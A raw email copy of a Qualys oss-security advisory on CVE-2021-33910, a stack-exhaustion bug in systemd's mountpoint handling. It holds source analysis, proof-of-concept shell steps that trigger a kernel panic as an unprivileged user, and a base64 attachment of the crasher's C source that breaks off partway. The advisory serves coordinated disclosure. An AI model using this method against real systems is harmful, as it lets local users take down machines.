X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["13995" "Tuesday" "20" "July" "2021" "12:39:48" "+0000" "Qualys Security Advisory" "qsa@qualys.com" nil "297" "[oss-security] CVE-2021-33910: Denial of service (stack exhaustion) in systemd (PID 1)" nil nil nil "7" nil nil (number mark "U       qsa@qualys.c Jul 20  297/13995 " thread-indent "\"[oss-security] CVE-2021-33910: Denial of service (stack exhaustion) in systemd (PID 1)\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-33910: Denial of service (stack exhaustion) in systemd (PID 1)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26358 invoked by uid 550); 20 Jul 2021 12:40:04 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26334 invoked from network); 20 Jul 2021 12:40:02 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
 date : message-id : content-type : mime-version; s=qualyscom;
 bh=Q22KBV1q2TKdZ1xQ7lmVy2VANDSviyFu1Ta+KH62Y74=;
 b=S3SjRSsAwhzhqsYDXjPN+9c0se7p0augwkwLe921fyqoHWbRjxXVtW42STwnDxw/GKD6
 pTkzTTU50kikyBaAHA3Kx2CZzHqou7uFoBL4H1t5TiqZSbenHTTvxKM0sRguwIgiKgZr
 pLODy/G10wCIqrlhXU9flKdXMO/GGB73K2dWoTFk6voVvI/E8J/GaMrE08JTk3HUOoOf
 bM4phg4q4knDkKgtwJTgiSFeKNuKDXs8krjje8deF4H0sZYajoAq6Vx5gj6SaG0jW3y+
 zAuCi9XaVgiZ5CTdPWvOvuEtyeM78cu6i+BkBCKkRtYl8m3gfsS2jS6f4DRyeXj/6SET Ew== 
Authentication-Results: ppops.net;
	spf=pass smtp.mailfrom=qsa@qualys.com
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=PYFiDiaIRwjaM5GPudxotG8eyhOgLpv9gH0WF3bdIcL/Y/jegZCOdp6HMEkdgfM8NA71xHWp/9+5HJxf7xLJc0MGX32RRJdYOBO0Gc+5L/nusT5lu+BDyRMYAa+lwJfUvXIoRB2ox4TEgo/OzPyiACw8WRlCG8y/6UZFZd4kIMnvtqaIi58mbhtbdlMCXNqx7PlRnc8Gdf+7hwprqHJ3p/+5k2DpNFglnvlXp1Tq7Ut7mjQam0pjLe0dKSgaVds8G4ws1Avs6U7vkZYKk5N8ZmOCq8aOHsiAS6Kz+CVNPvWk9iA1A22cXdFts903FfhUwrFtMt03vq2qF2aJgP1tQg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=Q22KBV1q2TKdZ1xQ7lmVy2VANDSviyFu1Ta+KH62Y74=;
 b=cij0KNn+u7rXM6o074YpoqgzAjSgUgRM0k2WU3N+ChbZYZIz3xBGx8vGqCUAB7Lch4sacyqq5Chb82/pMJzMbLRX5+yMiXn3pz1QFs5BoN1EoM38ShZZ2ZEQAc+1lLDyRVtQaZ1TDRzEQ4K51ztMVDsSYU2jOYH5EYovGhMUVu8WUtkLEpTLm6o9fMQndmNmfOYx5c62ObgMI9SqfGu+UETLHAhTFCdWk4hFkCs/OqtEcSfou/moji+jD2iNC4ygs2g2u33p4H9Stk6uM9gqw3S0LvhDU+Htn6sBJE1dw66dzXQta5JFyqe0uyAbhty/viwrwthYyWCHxXVwexLjCg==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector2-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=Q22KBV1q2TKdZ1xQ7lmVy2VANDSviyFu1Ta+KH62Y74=;
 b=JdnKOA2/Ok+Dx4UVbbx2CulZIS/e6BU4zt4Udvty1/LUA3n9EV9ugQYN18wiScMiwgliTH+cSAxYfNiGpU3cWQjHSP3yo+CbxEdfNpuhUFySf2jDlp/GpOgZmnRurph1mGuDcghMd7qz+IEgw0487m+sdQ7TL0cQVLre/5TJHhHfzWnM5qKSTCmTByxA/xGOfgRIqQpbmhagPdkwRBbiuu2CV7ZwHvTHSui7GI0R5LG6v2PxIOZvPN0vAV8I7KkhrbG6EBVg2NfLAT1wmRPNyEuW1fuwUMc79GQUk+vbuBNbmyDiT7AtWRAMaMXR2QWiTWngLFWu7rYhk05MAm3Omg==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: CVE-2021-33910: Denial of service (stack exhaustion) in systemd
 (PID 1)
Thread-Index: AQHXfWRTK1u+S8TEZE6Ie2CbmHwFvQ==
Date: Tue, 20 Jul 2021 12:39:48 +0000
Message-ID: <20210720123712.GB19170@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator: 
authentication-results: lists.openwall.com; dkim=none (message not signed)
 header.d=none;lists.openwall.com; dmarc=none action=none
 header.from=qualys.com;
x-ms-publictraffictype: Email
x-ms-office365-filtering-correlation-id: a8a57411-f07f-499e-f53a-08d94b7b763e
x-ms-traffictypediagnostic: BY5PR06MB6644:
x-microsoft-antispam-prvs: 
 <BY5PR06MB66446FB0EDF1C33D3148321CD5E29@BY5PR06MB6644.namprd06.prod.outlook.com>
x-ms-oob-tlc-oobclassifiers: OLM:10000;
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: 
 Kccxb3UtRqgrT5sVFxhccEPs3lqEw+VzS3QkuqD5tLrvLEimYu4VxbborkPFV7M5/gJIYk8WOf1Gyhroo01/GCc/d+ob6e8a+n5ES+qeDA5Hh0ffzhO0LQi1NUeVS7pP0i3PBT0avVs3c2UAETzyVZtRHmtCEj0JxuRAD6u6Yyw9tq4/vC32vkQbudTFOtkxNsfktMxNZ1FkqnjTIiUnwlzHmHEBDa3Ag5iqEQqvENZNM5IWVjXEU90+QcFNhSyzDPFGB0Sbkrh7jH6HZ+Fvgq8SHoz8Oqr6sfNEJy4W6Fhx9kyN9GtEU4amGbE/y14QIlGLJ2mRCMPEGbDDNrUdvzf9DifkVED64v1tFRk0IjG3ny821YHvjhpyzcr8ywXQfkn6j2ylHVYCSdmx3HldF496pfS98Gvx9Nkbqo3BPZ22+h1/BM84zhMyrIFlNZ5HFih1OZpBzmW3/5XTkvGKrR5UaJBdN7sZEQOnuMo5rvYoSxuZeIyMDlh4edQBcHLGA14fet5VmzsxD8NNVUe9ed0OZLg35gKSZ+JUE1ZIavmDaDu/uKXpUhvoffLF+MjM2N0jo9ajytiDh0E72lodIIL8yxgTuTcy9c+bkh89VeJku1dDjrW8Hz58qFQNbGAeS18+3YSyr9GTzxj8k1KH92i3etEz3EzixwiBMYHReCfKvSvXXQ9qvn8LYmUevuth9ehPl9x7UQ688UVEqRiXBZcr8nRrf7Qttd0qT9Aw3Z/4ubZ8opRo1hfsVQnbe4+agTy204RrhVagCsyx75drs5xxmGqAbto+y7mYyp56JnCtrMlmX6YUlZ5KUle92h90ySbyjuBpt7N1f3yQcsEkCg==
x-forefront-antispam-report: 
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(366004)(2906002)(1076003)(186003)(966005)(5660300002)(6512007)(316002)(9686003)(66616009)(99936003)(86362001)(8676002)(6486002)(38100700002)(122000001)(8936002)(6506007)(83380400001)(26005)(76116006)(508600001)(6916009)(66446008)(64756008)(71200400001)(33656002)(66476007)(66556008)(66946007)(38070700004);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: 
 =?us-ascii?Q?QSsj/aqaEsTkrdRl+w7opBY7Xy5EVr5C+GH14mypMACwuk0cdw3H2ymxEKo5?=
 =?us-ascii?Q?19QN9MS4a727mXbeQMdntUunJC0gDekr7eUyZEJUA7Vl+aUg+PI5lyasgfpD?=
 =?us-ascii?Q?e0bbdDSk1zURsUzQojLHfXu/s73thz9B4FpqhC4zRzWmphkusPyTKofWPSkZ?=
 =?us-ascii?Q?q41iQy0SmTQTHi1YdUFCPWxGGJ3fW8iOD3BAV30exEa9ZZfJjjkEFk73reTx?=
 =?us-ascii?Q?zccvLbGypXtANQJj29236DCKA5oXesbGy05+Imo8KMNC05A2G0qTZcmbQC7t?=
 =?us-ascii?Q?tOyrw3Q9pjiQwq9/nWFqB8PVln6I+s9NFiUlIg8ejUz6wdFGwVSZACpY/d3j?=
 =?us-ascii?Q?yXh+k2TMau6WVz88ExUS6TiVtJ+Wgu7lapeP0RsOyukX1VHqZgIJSJBgj20f?=
 =?us-ascii?Q?UBTCtJKoAMK8osFZG9uLedpI+IMale6aA8LjE3grCrt0gKYy9ekGL6lAykOv?=
 =?us-ascii?Q?1clPeIcaZGorYRPy8w14vLJmwBC337gESAuE75WEybjMppfhl9qI+ZOyFpny?=
 =?us-ascii?Q?Tvcqs0igLw8WCgxgzmL57ZSfl76YGhI3U8340UcTs4uFt5zvyZA79G5cADns?=
 =?us-ascii?Q?iePtTRs+dzG7Q+vB4OzVWKfk3ipZD367m3TebD1od7LPPZYUNLlT/DcbRRrR?=
 =?us-ascii?Q?nxpp1QvSY3RVzNsvDTRvE+j6wP/XOnm3BeToypJIXA8G6EUQT45FEPM7FLx2?=
 =?us-ascii?Q?Ws7eIbPHslS6/+iXc1o4kkSD67aiMG2fhCDj6kER6L+Qm74c2OP7Txc1cAi6?=
 =?us-ascii?Q?33xWeEGnxo82Z/cxLwVGSrwynQbk361C/8bRF6johbOwaWDmNHPlxxtGkGGJ?=
 =?us-ascii?Q?dcoZcxHMB1JPXsr5gFQekWoLAWD1xf7YZhpfMqqGy82soawICRhCCK1cCZX+?=
 =?us-ascii?Q?UGxsesK+8kNKofcFtlaDtZMWIaDAc+0qiecjFSX1g25WD2tJs7h8AUPVJV7H?=
 =?us-ascii?Q?anRVqT/k1DaFtEWefcovkwAceMPuc1eUynwdUw2rRH3+lnf6JWeVXkAFeOgI?=
 =?us-ascii?Q?YQVGSgKierywmn6ZUvQbcr1LT8dwfi9Z8UNJWzvH1LQqgxRSqiwMXd9l5I8P?=
 =?us-ascii?Q?JRjr0/jFCjNNOFh2ervMeAntxptiOVwX9Ly1l+D29X+DVkoo5Q2M3S0vkfuk?=
 =?us-ascii?Q?89htRzNlS+HrBUEuUltK7EH+c2Ve9JRbwUm4M1CiUvoXaPXNBeHYSRaT1GIf?=
 =?us-ascii?Q?aupepWReabw6Bjj0x6vSoAdT4mRsodoRuzT9sPeFNF/0/wd3IxVhlb3D2cVg?=
 =?us-ascii?Q?RBSfHy0X7Tb5q9OMtHsCagcHlH8F11pnrktNlX86JWtim23LtLKvdtLH/inD?=
 =?us-ascii?Q?EqlC/yKvL9LdORdAowQK62ezORA+h8sswxHj8kDIwA1FMQ=3D=3D?=
x-ms-exchange-transport-forked: True
Content-Type: multipart/mixed;
	boundary="_002_20210720123712GB19170localhostlocaldomain_"
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: a8a57411-f07f-499e-f53a-08d94b7b763e
X-MS-Exchange-CrossTenant-originalarrivaltime: 20 Jul 2021 12:39:48.5737
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: efeU5Zwi/CIhpMs6uGFaq8svz26sxYRUPKFpYDq2C0SpZr6O44j9RWdaMITb7nMYreDqO0TR3fHVXOW+k9UVA+z7qiDpPImKsdR8m7UPH3Q=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: BY5PR06MB6644
X-Proofpoint-GUID: uxNb4ml4QQg3XFxsHOhhNs5QChHuPZrJ
X-Proofpoint-ORIG-GUID: uxNb4ml4QQg3XFxsHOhhNs5QChHuPZrJ
X-Proofpoint-SPF-Result: pass
X-Proofpoint-SPF-Record: v=spf1 include:_spf.qualys.com include:spf.protection.outlook.com
 include:spf-001ca501.pphosted.com include:stspg-customer.com
 include:_spf.salesforce.com include:emailus.freshservice.com
 include:mktomail.com ~all
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.182.1,Aquarius:18.0.790,Hydra:6.0.391,FMLib:17.0.607.475
 definitions=2021-07-20_07,2021-07-19_01,2020-04-07_01
X-Proofpoint-Spam-Details: rule=inbound_notspam policy=inbound score=0 mlxlogscore=999 clxscore=1034
 phishscore=0 impostorscore=0 priorityscore=1501 suspectscore=0 bulkscore=0
 mlxscore=0 spamscore=0 malwarescore=0 lowpriorityscore=0 adultscore=0
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2107140000
 definitions=main-2107200081
Subject: [oss-security] CVE-2021-33910: Denial of service (stack exhaustion) in systemd (PID
 1)

--_002_20210720123712GB19170localhostlocaldomain_
Content-Type: text/plain; charset="us-ascii"
Content-ID: <5D63AA7DCB067E47A2BA9BC58F316C36@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable


Qualys Security Advisory

CVE-2021-33910: Denial of service (stack exhaustion) in systemd (PID 1)


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Summary
Analysis
Proof of concept
Acknowledgments
Timeline


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

In 2018, while working on our exploit for CVE-2018-14634 in the Linux
kernel, we accidentally discovered CVE-2018-16864 in systemd (journald);
in our "System Down" advisory we wrote: "Surprised by the heavy usage of
alloca() in journald, we searched for another attacker-controlled
alloca() and found CVE-2018-16865".

Recently, while working on our exploit for CVE-2021-33909 in the Linux
kernel, we accidentally stumbled upon CVE-2021-33910 in systemd (PID 1),
another attacker-controlled alloca():

https://wiki.sei.cmu.edu/confluence/display/c/MEM05-C.+Avoid+large+stack+al=
locations

Although attackers cannot exploit this vulnerability as a "Stack Clash"
to gain privileges (because the alloca()ted buffer is fully written to),
they can exploit it to crash systemd and hence the entire operating
system (a kernel panic). Our proof of concept, a 10-line change in
FUSE's "hello world" program, is attached to this advisory and is
available at:

https://www.qualys.com/research/security-advisories/

To the best of our knowledge, this vulnerability was introduced in
systemd v220 (April 2015) by commit 7410616c ("core: rework unit name
validation and manipulation logic"), which replaced a strdup() in the
heap with a strdupa() on the stack.

Note: a similar vulnerability was discovered in 2019 by Chris Coulson
(https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2019-6454).


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Analysis
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

systemd monitors and parses the contents of /proc/self/mountinfo, and
passes each mountpoint path to mount_setup_unit(), which passes it to
unit_name_from_path(), which passes it to unit_name_path_escape():

------------------------------------------------------------------------
1720 static int mount_load_proc_self_mountinfo(Manager *m, bool set_flags) {
....
1727         r =3D libmount_parse(NULL, NULL, &table, &iter);
....
1731         for (;;) {
....
1735                 r =3D mnt_table_next_fs(table, iter, &fs);
....
1742                 path =3D mnt_fs_get_target(fs);
....
1751                 (void) mount_setup_unit(m, device, path, options, fsty=
pe, set_flags);
------------------------------------------------------------------------
1644 static int mount_setup_unit(
1645                 Manager *m,
1646                 const char *what,
1647                 const char *where,
1648                 const char *options,
1649                 const char *fstype,
1650                 bool set_flags) {
....
1683         r =3D unit_name_from_path(where, ".mount", &e);
------------------------------------------------------------------------
512 int unit_name_from_path(const char *path, const char *suffix, char **re=
t) {
...
523         r =3D unit_name_path_escape(path, &p);
------------------------------------------------------------------------
380 int unit_name_path_escape(const char *f, char **ret) {
...
386         p =3D strdupa(f);
------------------------------------------------------------------------

At line 386, unit_name_path_escape() passes the mountpoint path to
strdupa(), which is similar to strdup() but allocates memory on the
stack (via alloca()), not in the heap (via malloc()).

As a result, if the total path length of this mountpoint exceeds 8MB
(the default RLIMIT_STACK), then systemd crashes with a segmentation
fault that also crashes the entire operating system (a kernel panic,
because systemd is the "global init", PID 1).


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Proof of concept
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

- First, as an unprivileged local user, we mount a basic FUSE filesystem
  (with FUSE's "hello world" program) to /tmp/hello/world:

------------------------------------------------------------------------
$ id
uid=3D65534(nobody) gid=3D65534(nogroup) groups=3D65534(nogroup)

$ mkdir -m 0700 -p /tmp/hello/world

$ ./CVE-2021-33910-crasher /tmp/hello/world

$ grep fuse /proc/self/mountinfo | wc
      2      22     239
------------------------------------------------------------------------

- Second, we create a deep directory whose total path length exceeds 8MB
  and move our FUSE filesystem to this directory:

------------------------------------------------------------------------
$ ./CVE-2021-33910-crasher /tmp/hello/world /tmp
creating directories, please wait...

$ grep fuse /proc/self/mountinfo | wc
      2      22 8389099
------------------------------------------------------------------------

- Third, to force systemd into re-parsing /proc/self/mountinfo (which
  contains our long directory path), we mount another FUSE filesystem
  and therefore crash systemd and the entire operating system:

------------------------------------------------------------------------
$ mkdir -m 0700 -p /tmp/hello/world

$ ./CVE-2021-33910-crasher /tmp/hello/world

Kernel panic - not syncing: Attempted to kill init!
------------------------------------------------------------------------

- Alternatively, because systemd v248 occasionally fails to monitor
  /proc/self/mountinfo (https://github.com/systemd/systemd/issues/19464)
  we force systemd into auto-mounting a filesystem itself; for example,
  the binfmt_misc filesystem:

------------------------------------------------------------------------
$ systemctl -a list-units '*binfmt_misc*'
  UNIT                              LOAD   ACTIVE   SUB     DESCRIPTION
  proc-sys-fs-binfmt_misc.automount loaded active   waiting Arbitrary...
  proc-sys-fs-binfmt_misc.mount     loaded inactive dead    Arbitrary...

$ cat /proc/sys/fs/binfmt_misc/status

Kernel panic - not syncing: Attempted to kill init!
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We thank Red Hat Product Security, systemd's developers, and the members
of linux-distros@openwall for their work on this coordinated disclosure.
We also thank Mitre's CVE Assignment Team.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2021-06-09: We sent our advisories for CVE-2021-33909 and CVE-2021-33910
to Red Hat Product Security (the two vulnerabilities are closely related
and the systemd-security mailing list is hosted by Red Hat).

2021-07-06: We sent our advisories, and Red Hat sent the patches they
wrote, to the linux-distros@openwall mailing list.

2021-07-20: Coordinated Release Date (12:00 PM UTC).


--_002_20210720123712GB19170localhostlocaldomain_
Content-Type: text/plain; name="CVE-2021-33910-crasher.c"
Content-Description: CVE-2021-33910-crasher.c
Content-Disposition: attachment; filename="CVE-2021-33910-crasher.c";
	size=3180; creation-date="Tue, 20 Jul 2021 12:39:48 GMT";
	modification-date="Tue, 20 Jul 2021 12:39:48 GMT"
Content-ID: <06F91AC6B5F7FF45B5C07EC91371E945@namprd06.prod.outlook.com>
Content-Transfer-Encoding: base64

LyoNCiAgRlVTRTogRmlsZXN5c3RlbSBpbiBVc2Vyc3BhY2UNCiAgQ29weXJp
Z2h0IChDKSAyMDAxLTIwMDcgIE1pa2xvcyBTemVyZWRpIDxtaWtsb3NAc3pl
cmVkaS5odT4NCg0KICBNb2RpZmllZCBieSBRdWFseXMgZm9yOg0KICBDVkUt
MjAyMS0zMzkxMDogRGVuaWFsIG9mIHNlcnZpY2UgKHN0YWNrIGV4aGF1c3Rp
b24pIGluIHN5c3RlbWQgKFBJRCAxKQ0KDQogIFRoaXMgcHJvZ3JhbSBjYW4g
YmUgZGlzdHJpYnV0ZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR1BM
Lg0KICBTZWUgdGhlIGZpbGUgQ09QWUlORy4NCg0KICBnY2MgLVdhbGwgaGVs
bG8uYyBgcGtnLWNvbmZpZyBmdXNlIC0tY2ZsYWdzIC0tbGlic2AgLW8gaGVs
bG8NCiovDQoNCiNkZWZpbmUgRlVTRV9VU0VfVkVSU0lPTiAyNg0KDQojaW5j
bHVkZSA8ZnVzZS5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8
c3RyaW5nLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxmY250
bC5oPg0KDQojaW5jbHVkZSA8bGltaXRzLmg+DQojaW5jbHVkZSA8c3RkbGli
Lmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNsdWRlIDxzeXMvdHlw
ZXMuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0Kc3RhdGljIGNvbnN0IGNo
YXIgKmhlbGxvX3N0ciA9ICJIZWxsbyBXb3JsZCFcbiI7DQpzdGF0aWMgY29u
c3QgY2hhciAqaGVsbG9fcGF0aCA9ICIvaGVsbG8iOw0KDQpzdGF0aWMgaW50
IGhlbGxvX2dldGF0dHIoY29uc3QgY2hhciAqcGF0aCwgc3RydWN0IHN0YXQg
KnN0YnVmKQ0Kew0KICAgIGludCByZXMgPSAwOw0KDQogICAgbWVtc2V0KHN0
YnVmLCAwLCBzaXplb2Yoc3RydWN0IHN0YXQpKTsNCiAgICBpZiAoc3RyY21w
KHBhdGgsICIvIikgPT0gMCkgew0KICAgICAgICBzdGJ1Zi0+c3RfbW9kZSA9
IFNfSUZESVIgfCAwNzU1Ow0KICAgICAgICBzdGJ1Zi0+c3RfbmxpbmsgPSAy
Ow0KICAgIH0gZWxzZSBpZiAoc3RyY21wKHBhdGgsIGhlbGxvX3BhdGgpID09
IDApIHsNCiAgICAgICAgc3RidWYtPnN0X21vZGUgPSBTX0lGUkVHIHwgMDQ0
NDsNCiAgICAgICAgc3RidWYtPnN0X25saW5rID0gMTsNCiAgICAgICAgc3Ri
dWYtPnN0X3NpemUgPSBzdHJsZW4oaGVsbG9fc3RyKTsNCiAgICB9IGVsc2UN
CiAgICAgICAgcmVzID0gLUVOT0VOVDsNCg0KICAgIHJldHVybiByZXM7DQp9
DQoNCnN0YXRpYyBpbnQgaGVsbG9fcmVhZGRpcihjb25zdCBjaGFyICpwYXRo
LCB2b2lkICpidWYsIGZ1c2VfZmlsbF9kaXJfdCBmaWxsZXIsDQogICAgICAg
ICAgICAgb2ZmX3Qgb2Zmc2V0LCBzdHJ1Y3QgZnVzZV9maWxlX2luZm8gKmZp
KQ0Kew0KICAgICh2b2lkKSBvZmZzZXQ7DQogICAgKHZvaWQpIGZpOw0KDQog
ICAgaWYgKHN0cmNtcChwYXRoLCAiLyIpICE9IDApDQogICAgICAgIHJldHVy
biAtRU5PRU5UOw0KDQogICAgZmlsbGVyKGJ1ZiwgIi4iLCBOVUxMLCAwKTsN
CiAgICBmaWxsZXIoYnVmLCAiLi4iLCBOVUxMLCAwKTsNCiAgICBmaWxsZXIo
YnVmLCBoZWxsb19wYXRoICsgMSwgTlVMTCwgMCk7DQoNCiAgICByZXR1cm4g
MDsNCn0NCg0Kc3RhdGljIGludCBoZWxsb19vcGVuKGNvbnN0IGNoYXIgKnBh
dGgsIHN0cnVjdCBmdXNlX2ZpbGVfaW5mbyAqZmkpDQp7DQogICAgaWYgKHN0
cmNtcChwYXRoLCBoZWxsb19wYXRoKSAhPSAwKQ0KICAgICAgICByZXR1cm4g
LUVOT0VOVDsNCg0KICAgIGlmICgoZmktPmZsYWdzICYgMykgIT0gT19SRE9O
TFkpDQogICAgICAgIHJldHVybiAtRUFDQ0VTOw0KDQogICAgcmV0dXJuIDA7
DQp9DQoNCnN0YXRpYyBpbnQgaGVsbG9fcmVhZChjb25zdCBjaGFyICpwYXRo
LCBjaGFyICpidWYsIHNpemVfdCBzaXplLCBvZmZfdCBvZmZzZXQsDQogICAg
ICAgICAgICAgIHN0cnVjdCBmdXNlX2ZpbGVfaW5mbyAqZmkpDQp7DQogICAg
